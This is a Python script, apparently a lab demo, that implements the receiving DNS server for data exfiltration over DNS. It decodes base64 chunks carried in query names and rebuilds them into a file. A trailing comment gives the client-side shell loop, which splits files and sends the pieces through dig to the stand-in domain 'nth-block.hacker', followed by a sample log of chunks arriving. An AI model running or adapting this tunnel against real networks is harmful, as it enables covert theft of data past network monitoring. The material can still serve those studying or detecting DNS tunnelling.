from twisted.internet import defer, reactor
from twisted.names import dns, error, server
import base64, binascii

class MockDNSResolver:
    def _doDynamicResponse(self, query):
        name = query.name.name
        record = dns.Record_A(address=b"127.0.0.1")
        answer = dns.RRHeader(name=name, payload=record)
        authority = []
        additional = []
        return [answer], authority, additional
 
    def query(self, query, timeout=None):
      print("Incoming query for:", query.name)
        
      #Extract the part of the file from the query
      data_part = str(query.name).split(".")[0]
        
      #Try base64 decoding it till successful
      for i in range(0,3):
         try:
               text = base64.b64decode(data_part.encode('utf-8'))
               break
         except binascii.Error:
               data_part += "="
      #Write the chunk to a file
      file_name = "reconstruction"
      with open(file_name,"a") as fh:
         fh.write(str(text,'utf-8'))
      
      #Return DNS response
      if query.type == dns.A:
         return defer.succeed(self._doDynamicResponse(query))
      else:
         return defer.fail(error.DomainError())

if __name__ == "__main__":
    clients = [MockDNSResolver()]
    factory = server.DNSServerFactory(clients=clients)
    protocol = dns.DNSDatagramProtocol(controller=factory)
    reactor.listenUDP(10053, protocol)
    reactor.listenTCP(10053, factory)
    reactor.run()
 
''' 
for i in $(ls xaa*);do DATA=$(cat $i | tr -d "="); dig -p 10053 @localhost $DATA.nth-block.hacker +short; done

NXP-MAC-J6YKRQ77W0:code nxp$ python3 dns-data-exfil/dns-server.py 
Incoming query for: P06EFQYpolR7fqiCI4FZEyBvyCPlDMsSGuh.nth-block.hacker
Incoming query for: H4sIAEoP92QAA+2TMQqAMAxFO3uKXECJNW3.nth-block.hacker
Incoming query for: P06EFQYpolR7fqiCI4FZEyBvyCPlDMsSGuh.nth-block.hacker
Incoming query for: 9r3w+uiSmKIiCiJoLdRqvDKM9+pyVCyMUoj.nth-block.hacker
Incoming query for: YZIAradkiQAy6xzZ5mjnfIqIY2vuRzz/mV+.nth-block.hacker
Incoming query for: 3gKXf0Kwa3AuVmw2++mv/5NhGKYUGwr9wK0.nth-block.hacker
Incoming query for: ACgAA.nth-block.hacker


'''